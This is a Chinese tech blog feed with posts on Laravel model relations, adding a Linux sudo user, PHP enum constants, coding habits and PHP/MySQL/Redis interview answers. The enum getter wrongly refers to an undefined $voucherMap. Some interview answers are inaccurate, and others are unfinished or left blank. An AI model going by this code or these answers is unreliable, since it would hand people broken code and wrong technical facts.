id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h2><blockquote><p>Laravel 中模型与模型之间是如何进行关联的呢？</p></blockquote><p>答案是通过主键与外键进行关联。</p><p>通过Eloquent 关联模型与模型之间的关系：</p><ol><li>一对一</li><li>一对多</li><li>多对一</li><li>多对多</li></ol><p><code>Auth::user()</code> 方法可以获取到当前用户的实例。</p><p>在User模型中定义了一个方法，然后通过<code>Auth::user()</code>获取到的实例进行调用。</p><p>如果没有一对多的关系，需要这样创建一条微博：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">App\Models\Status::create()</span><br></pre></td></tr></table></figure><p>如果将用户模型与微博模型进行关联之后，可以得到以下方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;statuses()-&gt;create()</span><br></pre></td></tr></table></figure><p>其中<code>statuses()</code> 是在用户模型中定义好的（名称可以不一样)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function statuses()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; user表正向关联 status表</span><br><span class="line">    return $this-&gt;hasMany(Status::class, &quot;user_id&quot;, &quot;id&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第八章学到了什么"><a href="#第八章学到了什么" class="headerlink" title="第八章学到了什么"></a>第八章学到了什么</h3><ul><li>两个模型之间如何进行关联</li><li>通过模型关联获取数据</li><li>对微博发布时间进行友好处理，并中文化</li><li>建立工厂、以及生成器、并生成假数据</li><li>通过数据关联来创建微博</li><li>通过数据关联来删除微博</li><li>修复批量赋值的错误</li></ul><h2 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h2><p>正式写SQL 之前，可以先使用tinker 通过模型操作数据。</p><p>通过在模型中定义一些方法，以便可以在其他地方直接获取到数据。</p><h3 id="第九章学到了什么"><a href="#第九章学到了什么" class="headerlink" title="第九章学到了什么"></a>第九章学到了什么</h3><ul><li>多对多关系应用</li><li>新增和销毁多对多关联</li><li>使用 with 来避免N+1 问题  </li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 添加用户及提权</title>
      <link href="/linux-to-add-users-and-rights/"/>
      <url>/linux-to-add-users-and-rights/</url>
      
        <content type="html"><![CDATA[<p>刚拿到一台服务器时，通常会禁用root 用户登录，而使用其他普通用户，这时就需要创建一个新用户。</p><a id="more"></a><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>创建一个新用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ useradd boo</span><br></pre></td></tr></table></figure><p>设置密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ passwd boo</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>此时此用户已经可以正常使用了，但是还没有提权，所以很多事情做不了，这时可以把该用户加入<code>sudo</code> 用户组，通过<code>sudo</code>命令来进行提权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ usermod -G sudo boo</span><br></pre></td></tr></table></figure><p>一般直接就加入成功了，但是有些发行版本默认并没有<code>sudo</code>用户组，所以这时需要先添加用户组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ groupadd sudo</span><br></pre></td></tr></table></figure><p>手动添加完用户组之后，还需要修改<code>sudoers</code>配置文件，这里有几种方式，根据实际情况进行选择：</p><ol><li>允许<code>sudo</code> 组的成员执行任何命令</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo &#x2F;&#x2F; 或者 sudo vim &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 添加以下内容</span><br><span class="line"># the &#39;sudo&#39; group has all the sudo privileges</span><br><span class="line">%sudo ALL&#x3D;(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><ol start="2"><li>直接允许该用户执行任何命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 添加以下内容，注意：没有% </span><br><span class="line"># Allow boo to run any commands anywhere</span><br><span class="line">boo ALL&#x3D;(ALL:ALL) ALL</span><br></pre></td></tr></table></figure></li></ol><p>通常还是建议将用户添加至<code>sudo</code> 用户组，然后赋予<code>sudo</code> 组成员权限，而不是直接对具体某个用户进行提权。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>查看所有用户的列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>查看所有用户组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;group</span><br></pre></td></tr></table></figure><p>查看当前登入用户的组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ groups</span><br></pre></td></tr></table></figure><p>查看指定用户所在的组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ groups usernmae</span><br></pre></td></tr></table></figure><p>添加用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ useradd username</span><br></pre></td></tr></table></figure><p>设置(重置)密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ passwd username</span><br></pre></td></tr></table></figure><p>添加用户组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ groupadd group_name</span><br></pre></td></tr></table></figure><p>将某个用户添加到某个组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ usermod -G group_name username</span><br></pre></td></tr></table></figure><p>编辑sudoers 配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo visudo</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何在 PHP 中使用枚举</title>
      <link href="/how-do-I-use-enumerations-in-php/"/>
      <url>/how-do-I-use-enumerations-in-php/</url>
      
        <content type="html"><![CDATA[<p>在编写业务代码时，常常会遇到状态或者类型不一致造成的逻辑分支，这时，最忌讳的是直接在业务代码中对数值进行判断。</p><a id="more"></a><p>那么更好的方式应该是怎样呢？<strong>使用枚举</strong>。</p><p>使用枚举有以下几个好处：</p><ol><li>减少因为直接输入数字而导致的错误</li><li>使代码更易于阅读</li><li>方便维护，后面需要添加新的类型时，不会突兀</li></ol><p>PHP 本身不支持枚举，但是使用类中的常量去定义可以实现等价的效果。</p><h2 id="定义枚举"><a href="#定义枚举" class="headerlink" title="定义枚举"></a>定义枚举</h2><p>下面为用户类型创建一个枚举，用户可以是以下三种类型之一：</p><ol><li>普通用户</li><li>管理员</li><li>超级管理员</li></ol><p>看起来像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class UserType extends Enum</span><br><span class="line">&#123;</span><br><span class="line">  const MEMBER &#x3D; 1;</span><br><span class="line">  const ADMIN &#x3D; 2;</span><br><span class="line">  const SUPERADMIN &#x3D; 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用枚举"><a href="#使用枚举" class="headerlink" title="使用枚举"></a>使用枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($user-&gt;type &#x3D;&#x3D;&#x3D; UserType::MEMBER)&#123;</span><br><span class="line">  &#x2F;&#x2F; todo </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们不使用枚举，代码可能就会变成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ($user-&gt;type &#x3D;&#x3D;&#x3D; 1) &#123; &#x2F;&#x2F; 这个1表示什么??</span><br><span class="line">    &#x2F;&#x2F; todo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($user-&gt;type &#x3D;&#x3D;&#x3D; &#39;Member&#39;) &#123; &#x2F;&#x2F; 这他妈咋么又是字符串 😞</span><br><span class="line">    &#x2F;&#x2F; todo </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="定义获取器"><a href="#定义获取器" class="headerlink" title="定义获取器"></a>定义获取器</h2><p>很多时候我们希望能获取到某个类型对应的具体含义，这时可以通过定义获取器来获取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class UserType extends Enum</span><br><span class="line">&#123;</span><br><span class="line">  public static $userType &#x3D; [</span><br><span class="line">  self::MEMBER &#x3D;&gt; &quot;普通会员&quot;,</span><br><span class="line">  self::ADMIN &#x3D;&gt; &quot;管理员&quot;,</span><br><span class="line">  self::SUPERADMIN &#x3D;&gt; &quot;超级管理员&quot;</span><br><span class="line">  ];</span><br><span class="line">  </span><br><span class="line">  public static function getUserType($type)</span><br><span class="line">  &#123;</span><br><span class="line">  return self::$voucherMap[$type];</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样当我们在调用<code>getUserType</code> 方法时，只需要传入对应的类型，就能获取到<code>普通会员</code>、<code>管理员</code>、<code>超级管理员</code>了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/laravel/t/36091" target="_blank" rel="noopener">在 Laravel 中使用枚举</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写代码的好习惯</title>
      <link href="/good-habit-of-writing-code/"/>
      <url>/good-habit-of-writing-code/</url>
      
        <content type="html"><![CDATA[<p>前段时间看到一篇比较火的文章，结合自己的一些经验，整理以下“好习惯”。</p><a id="more"></a><ol><li>修改完代码，一定要记得自测一下，即使只是改了一个变量。</li><li>方法入参尽量都做校验。</li><li>添加新接口时，需要注意老接口的兼容性。</li><li>对于复杂的代码逻辑，有必要写清楚注释。</li><li>使用完IO 资源流，一定要记得关闭。</li><li>尽量不要在循环里远程调用或者数据库操作，特别是select。优先考虑批处理。</li><li>考虑并发一致性的问题。</li><li>根据实际的业务场景去拆解功能，不是所有的功能都需要用特别高深的技术去实现。</li></ol><hr><ol><li>避免多层<code>if...else</code>嵌套。</li><li>一个类做好一件事情，一个控制器维护好一个功能。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://mp.weixin.qq.com/s/Iv5xWG6GZK7goq0BMZjh4w" target="_blank" rel="noopener">写代码有这16个好习惯，可以减少80%非业务的bug</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 碎碎念 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 常见面试题整理</title>
      <link href="/php-common-interview-questions/"/>
      <url>/php-common-interview-questions/</url>
      
        <content type="html"><![CDATA[<p>年前年后这段时间一直在为面试做准备，本文将从网络、PHP、Mysql、Redis、Linux 这几部分整理一下常见的一些面试简答题。</p><a id="more"></a><h2 id="网络篇"><a href="#网络篇" class="headerlink" title="网络篇"></a>网络篇</h2><h3 id="常见的状态码及其含义"><a href="#常见的状态码及其含义" class="headerlink" title="常见的状态码及其含义"></a>常见的状态码及其含义</h3><table><thead><tr><th>状态码</th><th>含义</th></tr></thead><tbody><tr><td>200</td><td>请求成功</td></tr><tr><td>301</td><td>重定向</td></tr><tr><td>304</td><td>资源未被修改可以使用旧资源</td></tr><tr><td>404</td><td>资源找不到</td></tr><tr><td>403</td><td>请求被拒绝</td></tr><tr><td>500</td><td>服务端错误</td></tr><tr><td>502</td><td>网关错误</td></tr><tr><td>504</td><td>网关超时</td></tr></tbody></table><h3 id="表单提交-get-和-post-的区别"><a href="#表单提交-get-和-post-的区别" class="headerlink" title="表单提交 get 和 post 的区别"></a>表单提交 get 和 post 的区别</h3><ol><li>Get 请求是将请求参数放在 url 后面，等同于直接放在了请求头中，Post 请求则是把请求参数放在请求体中。</li><li>Post 更安全，不会作为url的一部分，不会被缓存及保存在浏览器记录中。</li><li>Post 能发送更多的内容及更多的数据类型，get 只能发送 2048 个ASCII 字符</li><li>Post 比Get 慢（原因是因为post 需要在服务器确认之后再发送数据）</li><li>Get 通常用于资源的获取，Post 通常用于资源的更新</li></ol><h3 id="http-和-https-的区别"><a href="#http-和-https-的区别" class="headerlink" title="http 和 https 的区别"></a>http 和 https 的区别</h3><ol><li>首先两者所使用的协议不一样，其端口也不一样。</li><li>这也是https 比 http 要安全的原因，http 是明文传输，数据都是未加密的，而https 则是 ssl + http 协议进行加密传输。</li><li>http 比 https 要快，这是因为http 只需要进行tcp 三次握手连接，只需要交换三个包，而 https 除了进行tcp 连接，还需要 ssl 握手的九个包，一共是十二个包。</li><li>https 是构建在http 之上的协议，理论上，https 相较 http 会更消耗服务器资源。</li></ol><h3 id="session-和-cookie-的区别"><a href="#session-和-cookie-的区别" class="headerlink" title="session 和 cookie 的区别"></a>session 和 cookie 的区别</h3><ol><li>存储方式不同：cookie 是存储在客户端，session 则是存储在服务端。</li><li>隐私策略不同：cookie 因为存储在客户端中，所以对客户端是可见的，而session </li></ol><h3 id="UDP-和TCP-的区别"><a href="#UDP-和TCP-的区别" class="headerlink" title="UDP 和TCP 的区别"></a>UDP 和TCP 的区别</h3><p>UDP 是面向报文的、不可靠的数据报协议，TCP 是面向连接的、可靠的流协议。</p><ol><li>TCP 面向连接; UDP 不需要连接，即发送数据之前不需要建立连接;</li><li>TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达; UDP尽最大努力交付，即不保保证可靠交付</li><li>TCP面向字节流，实际上是TCP把数据看成一连串无结构的字节流; UDP是面向报文的，UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低</li><li>每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信</li><li>TCP首部开销20字节;UDP的首部开销小，只有8个字节</li><li>TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道</li></ol><blockquote><p>说一说TCP 的“粘包”问题</p></blockquote><p>结论：TCP 的“粘包”问题其实是一个伪命题。</p><p>服务端建立服务，客户端发起连接，正常情况下，服务端每次send，客户端都能正常recv，但在并发的情况下，服务端的两次send或者多次send，客户端可能只有一次recv了。这就导致了所谓的“粘包”问题的产生。</p><p>TCP 协议的本质是流协议，它只会保证以什么顺序发送字节，接受方就一定能按照这个顺序接收到，所以所谓的粘包问题不应该是传输层面的问题，而是应用层面的问题。</p><h3 id="简述TCP-三次握手"><a href="#简述TCP-三次握手" class="headerlink" title="简述TCP 三次握手"></a>简述TCP 三次握手</h3><p>概念：指在发送数据的准备阶段，服务器和客户端之间需要三次交互。</p><p>第一次握手：客户端向服务端发送一个SYN包，并进入SYN_SENT 状态，等待服务端确认<br>第二次握手：当服务器收到请求之后，此时要给客户端一个确认信息ACK，同时发送SYN报，此时服务器进入 SYN_RECV 状态<br>第三次握手：客户端收到服务器发的ACK + SYN 包后，向服务器发送ACK，发送完毕之后，客户端和服务器进入TCP 连接成功状态，完成三次握手。</p><blockquote><p>为什么握手一定要三次，不能两次吗？</p></blockquote><p>这是为了防止已经失效的连接请求报文突然又传到Tcp 服务器，避免产生错误。</p><h3 id="简述TCP-四次挥手"><a href="#简述TCP-四次挥手" class="headerlink" title="简述TCP 四次挥手"></a>简述TCP 四次挥手</h3><p>概念：所谓四次挥手就是说关闭TCP 连接的过程，当断开一个TCP 连接时，需要客户端和服务器共共发送四个包确认。</p><p>第一次挥手：客户端发送一个FIN，用来关闭客户端到服务器的数据传输，客户端进入 fin_wait 状态<br>第二次挥手：服务器收到fin 后，发送一个ack 给客户端，确认序号为收到序号+1，服务器进入close_wait 状态<br>第三次挥手：服务器发送一个fin 用来关闭服务器到客户端的数据传输，服务器进入 last_ack 状态<br>第四次挥手：客户端收到fin 后，客户端进入time_wait 状态，接着发送一个ack 给服务器，确认序号为收到序号+1，服务器进入 closed 状态，完成四次挥手。</p><h3 id="建立socket-需要哪些步骤"><a href="#建立socket-需要哪些步骤" class="headerlink" title="建立socket 需要哪些步骤"></a>建立socket 需要哪些步骤</h3><ul><li>创建socket</li><li>绑定socket 到指定地址和端口</li><li>开始监听连接</li><li>读取客户端输入</li><li>关闭 socket</li></ul><h3 id="简述从浏览器输入-a-com-回车之后发生了什么"><a href="#简述从浏览器输入-a-com-回车之后发生了什么" class="headerlink" title="简述从浏览器输入 a.com 回车之后发生了什么"></a>简述从浏览器输入 a.com 回车之后发生了什么</h3><ol><li>DNS 域名解析，寻找对应的IP 地址</li><li>根据这个IP 找到对应的服务器，建立TCP 连接（三次握手）</li><li>TCP 建连之后，发起HTTP 请求</li><li>服务器响应 HTTP 请求</li><li>客户端接收数据解析并渲染页面</li><li>服务器关闭TCP 连接（四次挥手）</li></ol><h3 id="长连接与短连接的区别"><a href="#长连接与短连接的区别" class="headerlink" title="长连接与短连接的区别"></a>长连接与短连接的区别</h3><p>短连接为每一次的数据传输准备了一个传输通道，而长连接则是建立一条通道，并一直保持，每一次传输时都会复用同一条连接通道。</p><h3 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h3><p>Websocket 是一种通信协议，连接刚开始还是HTTP 协议，由客户端发起，然后切换成Websocket 协议。</p><p>它的存在，由轮询变成了客户端可以主动向服务端发送消息。</p><blockquote><p>什么是轮询？</p></blockquote><p>轮询是一种获取信息的方式。</p><h2 id="PHP篇"><a href="#PHP篇" class="headerlink" title="PHP篇"></a>PHP篇</h2><h3 id="值传递和引用传递的区别"><a href="#值传递和引用传递的区别" class="headerlink" title="值传递和引用传递的区别"></a>值传递和引用传递的区别</h3><p>值传递：传递的是变量在内存中的副本。<br>引用传递：传递的是变量在内存中的地址。</p><p>unset 并不会真正意义上注销一个变量，而是切断了变量名和实际值之间的关系，其变量只要还被引用就还没有被释放。</p><h3 id="composer-自动加载原理"><a href="#composer-自动加载原理" class="headerlink" title="composer 自动加载原理"></a>composer 自动加载原理</h3><p>composer 的核心加载思想是通过composer 的<code>autoload.php</code>，将类和路径的对应关系加载到内存中，最后将具体的加载实现注册到 <code>spl_autoload_register</code> 函数中。</p><h3 id="常用的请求第三方接口有哪几种方式？"><a href="#常用的请求第三方接口有哪几种方式？" class="headerlink" title="常用的请求第三方接口有哪几种方式？"></a>常用的请求第三方接口有哪几种方式？</h3><ol><li><code>curl</code></li><li><code>file_get_contents</code></li><li><code>fopen</code></li></ol><h3 id="抽象类和接口类的区别"><a href="#抽象类和接口类的区别" class="headerlink" title="抽象类和接口类的区别"></a>抽象类和接口类的区别</h3><p>抽象用于描述不同的事物，接口用于描述事物的行为</p><h3 id="进程与线程的区别"><a href="#进程与线程的区别" class="headerlink" title="进程与线程的区别"></a>进程与线程的区别</h3><p>进程是CPU 分配内存的最小单位，线程是CPU 调度的最小单位，一个进程可以有多个线程，一个线程只能有一个进程。</p><h3 id="Swoole-的进程模型"><a href="#Swoole-的进程模型" class="headerlink" title="Swoole 的进程模型"></a>Swoole 的进程模型</h3><p>Swoole 的进程模型采用主进程、管理进程、异步任务/工作进程协作的方式。</p><ul><li>Manager 进程主要负责创建/回收 worker/task 进程</li><li>Reactor 进程主要负责维护客户端 TCP 连接、处理网络 IO、处理协议、收发数据</li><li>Worker/Task 进程主要负责执行PHP 代码。</li></ul><h3 id="PHP-的进程模型"><a href="#PHP-的进程模型" class="headerlink" title="PHP 的进程模型"></a>PHP 的进程模型</h3><p>在LNMP 的模式下，PHP 是php-fpm 多进程+阻塞I/O 的进程模型。</p><h3 id="同步、异步、阻塞、非阻塞是怎么回事？"><a href="#同步、异步、阻塞、非阻塞是怎么回事？" class="headerlink" title="同步、异步、阻塞、非阻塞是怎么回事？"></a>同步、异步、阻塞、非阻塞是怎么回事？</h3><ul><li>同步和异步是一种消息通信机制。</li><li>阻塞和非阻塞是一种业务流程处理方式。</li><li>IO 多路复用：用一个线程来检查Socket 的就绪状态。</li></ul><h3 id="并发、并行有什么区别？"><a href="#并发、并行有什么区别？" class="headerlink" title="并发、并行有什么区别？"></a>并发、并行有什么区别？</h3><p>并发：两件或者多件事情在同一时间间隔内发生<br>并行：两件或者多件事情在同一时刻发生</p><p>区别在与：在同一个时刻，对于并行来说，事件是一并发生，而对于并发来说，在宏观看来也是一并发生，但在微观上却是交替发生。</p><h3 id="简述PHP-代码解析过程"><a href="#简述PHP-代码解析过程" class="headerlink" title="简述PHP 代码解析过程"></a>简述PHP 代码解析过程</h3><p>Zend 引擎首先会将PHP 代码进行解析（词法、语法解析）成 opcode，然后Zend 虚拟机会顺序执行这些指令。</p><h3 id="从LNMP-的角度简述一次完整的请求过程"><a href="#从LNMP-的角度简述一次完整的请求过程" class="headerlink" title="从LNMP 的角度简述一次完整的请求过程"></a>从LNMP 的角度简述一次完整的请求过程</h3><p>当客户端发起一个请求到服务端，Web Server 首先会判断该请求是静态还是动态？<br>如果是静态，直接返回对应的静态资源。<br>如果是动态，FastCGI 会将该请求转发给本地 9000 端口（9000 是 PHP—FPM 所监听的端口），PHP-FPM 主进程接收到请求之后，<br>会分配一个空闲的 Worker 进程去处理这个请求，处理完成之后将数据返回给 FastCGI，再由 Nginx 返回给客户端。</p><h3 id="PHP-可以做常驻内存吗？为什么？"><a href="#PHP-可以做常驻内存吗？为什么？" class="headerlink" title="PHP 可以做常驻内存吗？为什么？"></a>PHP 可以做常驻内存吗？为什么？</h3><p>传统的PHP 无法以常驻内存的方式运行，这是因为PHP是解释型脚本语言，这种运行机制使得每个PHP 页面解释执行后，所有资源都被回收了。</p><h3 id="通常如何实现用户登录（API）"><a href="#通常如何实现用户登录（API）" class="headerlink" title="通常如何实现用户登录（API）"></a>通常如何实现用户登录（API）</h3><p>有两种方式：一种是普通的 token 令牌，另一种则是JWT。</p><p>普通Token：<br>用户初次登录会携带用户名和密码等信息，服务端验证通过之后，会给客户端返回一个Token。<br>这个Token 可以是由用户名、密码、登录设备、登录IP 等信息加密之后组成，<br>以后的客户端每一次请求都会携带这个Token，服务端则会验证该Token。</p><h3 id="在PHP中，你是如何捕获异常的？"><a href="#在PHP中，你是如何捕获异常的？" class="headerlink" title="在PHP中，你是如何捕获异常的？"></a>在PHP中，你是如何捕获异常的？</h3><p>尽量避免使用<code>exit</code>、<code>die</code>方法直接退出，而使用<code>try...catch</code>来捕获异常。</p><h3 id="常见设计模式"><a href="#常见设计模式" class="headerlink" title="常见设计模式"></a>常见设计模式</h3><p>创造型：工厂模式、单例模式、原型模式<br>结构型：适配器模式、装饰模式、门面模式、代理模式<br>行为型：迭代器模式、中介模式、观察者模式</p><h3 id="什么是依赖注入"><a href="#什么是依赖注入" class="headerlink" title="什么是依赖注入"></a>什么是依赖注入</h3><p>依赖注入主要用来减少代码间的耦合，有效分离对象和它所需要的外部资源。</p><h2 id="Mysql篇"><a href="#Mysql篇" class="headerlink" title="Mysql篇"></a>Mysql篇</h2><p>Mysql 的InnoDb 和MyISAM 引擎有何不同？</p><ul><li>InnoDb 的特点包括：事务、锁</li><li>InnoDb 支持 ACID 的事务 4个特性，MyISAM 不支持事务。</li><li>InnoDB 支持行级别的锁粒度，MyISAM 不支持，只支持表级别的锁粒度。</li></ul><h3 id="什么是ACID（事务的四个特性）？"><a href="#什么是ACID（事务的四个特性）？" class="headerlink" title="什么是ACID（事务的四个特性）？"></a>什么是ACID（事务的四个特性）？</h3><ul><li>原子性（Atomicity）：事务的所有操作，要么全部完成，要么全部不完成，不会结束在某个中间环节。</li><li>一致性（Consistency）：事务开始之前和事务结束之后，数据库的完整性限制未被破坏。</li><li>隔离性（Isolation）：两个或者多个事务的执行是互不干扰的，一个事务不可能看到其他事务运行时，中间某一时刻的数据。</li><li>持久性（Durability）：事务完成之后，事务所做的修改进行持久化保存，不会丢失。</li></ul><h3 id="Mysql-有几种事务隔离级别？"><a href="#Mysql-有几种事务隔离级别？" class="headerlink" title="Mysql 有几种事务隔离级别？"></a>Mysql 有几种事务隔离级别？</h3><p>有四种隔离级别。</p><h3 id="死锁是什么？"><a href="#死锁是什么？" class="headerlink" title="死锁是什么？"></a>死锁是什么？</h3><p>两个或多个事务在同一个资源上相互占用。</p><h3 id="简述Mysql-索引、主键及其常见索引"><a href="#简述Mysql-索引、主键及其常见索引" class="headerlink" title="简述Mysql 索引、主键及其常见索引"></a>简述Mysql 索引、主键及其常见索引</h3><p>索引就是类似于书籍目录的存在，主键是用于确定字段的唯一性。</p><ul><li>普通索引：最普通的索引，使用没有什么限制。</li><li>唯一索引：与普通索引类型，唯一不同的是，列值不允许重复，但允许有空值。</li><li>主键索引：主键本身自带的索引，不允许有空值。</li><li>全文索引：仅可用于 MyISAM 表，针对较大的数据，生成全文索引很耗时占空间</li><li>组合索引：为了提高多条件查询效率，可建立组合索引，遵循”最左前缀匹配原则”</li></ul><p>但是索引也不是越多越好，索引加快了查询速度，但同时也会影响更新速度。</p><h2 id="Redis篇"><a href="#Redis篇" class="headerlink" title="Redis篇"></a>Redis篇</h2><h3 id="Redis-和Memcache-的区别"><a href="#Redis-和Memcache-的区别" class="headerlink" title="Redis 和Memcache 的区别"></a>Redis 和Memcache 的区别</h3><ul><li>Redis 支持多种数据类型，Memcache 只支持Key-Value</li><li>Redis 支持两种持久化，Memcache 不支持持久化。</li></ul><h3 id="Redis-的常见数据结构及其应用场景"><a href="#Redis-的常见数据结构及其应用场景" class="headerlink" title="Redis 的常见数据结构及其应用场景"></a>Redis 的常见数据结构及其应用场景</h3><ul><li>字符串</li><li>哈希</li><li>列表</li><li>无序列表</li><li>集合</li></ul><h3 id="Redis-的持久化有几种方案？"><a href="#Redis-的持久化有几种方案？" class="headerlink" title="Redis 的持久化有几种方案？"></a>Redis 的持久化有几种方案？</h3><p>有三种，分别是：RDB、AOF、混合。</p><ol><li>RDB：将某一时刻的数据以二进制形式写入到磁盘里，服务重启时检测到对应文件自动加载进行数据恢复，有手动触发和自动触发两种机制。</li><li>AOF：以文件追加的方式写入客户端执行的写命令，数据恢复时，通过创建伪客户端的方式执行命令，直到恢复完成。</li><li>混合：在写入的时候先把数据以 RDB 的形式写入文件的开头，再将后续的写命令以 AOF 的格式追加到文件中。</li></ol><h3 id="为什么Redis-是单线程？"><a href="#为什么Redis-是单线程？" class="headerlink" title="为什么Redis 是单线程？"></a>为什么Redis 是单线程？</h3><h2 id="Linux篇"><a href="#Linux篇" class="headerlink" title="Linux篇"></a>Linux篇</h2><h3 id="说一下你常用的Linux-命令（最基础的不用说）"><a href="#说一下你常用的Linux-命令（最基础的不用说）" class="headerlink" title="说一下你常用的Linux 命令（最基础的不用说）"></a>说一下你常用的Linux 命令（最基础的不用说）</h3><ul><li>网络：<code>ping</code>、<code>tcpping</code>、<code>telnet</code>、<code>netstat</code>、<code>nmap</code>、<code>lsof</code>、<code>tcpdump</code></li><li>磁盘：<code>df</code>、<code>du</code></li><li>进程：<code>ps</code>、<code>pstree</code></li><li>内存：<code>free</code></li><li>负载：<code>top</code></li><li>压测工具：<code>ab</code>、<code>wrk</code></li><li>文件上传/下载：<code>curl</code>、<code>wget</code>、<code>scp</code></li><li>综合：<code>glances</code></li></ul><h3 id="基本的运维需要监控哪些数据？"><a href="#基本的运维需要监控哪些数据？" class="headerlink" title="基本的运维需要监控哪些数据？"></a>基本的运维需要监控哪些数据？</h3><ul><li>系统层：CPU、内存、负责、网卡、I/O</li><li>应用层：QPS、API响应时长、Redis内存使用量、任务队列数、php-fpm 